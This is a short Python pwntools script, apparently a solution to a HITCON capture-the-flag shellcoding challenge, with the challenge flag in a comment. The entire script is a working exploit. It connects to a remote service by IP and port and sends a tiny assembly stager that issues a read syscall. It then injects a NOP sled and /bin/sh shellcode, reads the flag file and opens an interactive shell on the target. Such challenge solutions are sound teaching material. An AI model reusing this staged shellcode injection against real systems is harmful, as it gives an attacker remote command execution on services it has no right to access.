#!/usr/bin/env python
from pwn import *

# hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}

context.arch = 'amd64'

host , port = '52.69.40.204' , 8361
y = remote( host , port )


_asm = '''
mov dx, 0x1000
sub rsp, rdx
pop rbx
pop r15
pop rsi
syscall
'''

print len( asm( _asm ) )
print ' '.join( hex( ord( i ) ).replace( '0x' , '' ) for i in asm( _asm ) )

y.sendafter( ':' , asm( _asm )  )

sleep( 0.7 )

y.send( '\x90' * 0x70 + asm( shellcraft.sh() ) )

sleep( 0.7 )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
